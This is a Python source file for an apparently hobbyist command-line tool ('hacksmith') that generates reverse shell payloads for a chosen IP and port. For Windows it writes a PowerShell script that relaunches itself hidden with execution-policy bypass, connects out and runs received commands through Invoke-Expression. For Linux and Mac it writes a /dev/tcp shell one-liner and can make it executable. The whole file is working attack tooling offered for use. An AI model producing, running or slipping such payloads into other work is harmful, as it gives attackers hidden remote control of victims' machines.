import argparse
import ipaddress
import sys
import socket
import subprocess


class Dozer:
    """
    tool
    """

    def __init__(self, ip: str, port: int, os: str, output: str) -> None:
        """
        initialization for hacksmith tool
        """
        if not self.__check_ip(ip):
            self.__error("invalid ip")
            sys.exit(1)
        self.ip = ip
        self.port = port
        self.os = os
        self.output_filename = output

    def create(self):
        """
        create super cool fancy reverse shell
        """

        print("creating dozer_shell")
        print("-------------")
        print(f"ip = {self.ip}")
        print(f"port = {self.port}")
        print(f"os = {self.os}")
        print("-------------")

        match self.os:
            case "windows":
                print(f"creating {self.output_filename} revshell for windows")
                self.__windows_rev_shell()
            case "linux":
                print(f"creating {self.output_filename} revshell for linux")
                self.__mac_linux_shell()
            case "mac":
                print(f"creating {self.output_filename} revshell for mac")
                self.__mac_linux_shell()
            case "android":
                print(f"creating {self.output_filename} revshell for android")
                print("not available yet :( ")
            case "ios":
                print(f"creating {self.output_filename} revshell for ios")
                print("creating revshell for ios")

        return

    def init_listener(self) -> bool:
        return True

    def __windows_rev_shell(self) -> None:
        ps_script = f"""\
# Check if script is running with the right args (hidden, no profile, bypass)
if (-not ($MyInvocation.InvocationName -like "*-nop*" -and $host.UI.RawUI.WindowTitle -eq "")) {{
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-nop -W hidden -noni -ep bypass -File `"$PSCommandPath`""
    $psi.WindowStyle = "Hidden"
    $psi.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    exit
}}

$TCPClient = New-Object Net.Sockets.TCPClient("{self.ip}", {self.port})
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function WriteToStream ($String) {{
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}}
    $StreamWriter.Write($String + "DOZER_SHELL> ")
    $StreamWriter.Flush()
}}

WriteToStream ''

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {{
        Invoke-Expression $Command 2>&1 | Out-String
    }} catch {{
        $_ | Out-String
    }}
    WriteToStream ($Output)
}}

$StreamWriter.Close()
"""

        with open(f"{self.output_filename}.ps1", "w", encoding="utf-8") as f:
            f.write(ps_script)
            print(f"//LOG: created {self.output_filename} file")

    def __mac_linux_shell(self) -> None:
        """
        mac and linux has same rev shell, fuck your naming patterns
        """
        script = f"sh -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
        with open(f"{self.output_filename}.sh", "w", encoding="utf-8") as f:
            f.write(script)
            print(f"//LOG: created {self.output_filename}.sh")
            user_input = input("do you wanna make it executable (Y/n): ").lower()
            if user_input == "y":
                print("//LOG: making rev shell executable")
                subprocess.run(["chmod", "+x", f"{self.output_filename}.sh"])
                print("//LOG: revshell is now exectuable!")

    def __check_ip(self, ip: str) -> bool:
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

    def __error(self, err_message: str) -> None:
        print(err_message)


def main():
    parser = argparse.ArgumentParser(
        prog="hacksmith",
        description="tool for making crossplaftform revshells",
        epilog="made by n0_sh4d3",
    )

    parser.add_argument("--ip", help="home ip address")
    parser.add_argument("--port", help="port number")
    parser.add_argument("--output", help="name for output revshell file")
    parser.add_argument(
        "--os",
        help="target os",
        choices=[
            "windows",
            "linux",
            "mac",
            "android",
            "ios",
        ],
    )

    args = parser.parse_args()
    try:
        args.port = int(args.port)

    except ValueError:
        print("port must be an int")
        sys.exit(1)

    if args.port <= 1024:
        print("port cannot be lower than 1024")
    if args.port > 65535:
        print("port cannot be higher than 65535")

    if args.output is None:
        args.output = "rev_shell"

    # that's all i need to see in main lol
    tool = Dozer(ip=args.ip, port=args.port, os=args.os, output=args.output)
    tool.create()


if __name__ == "__main__":
    main()
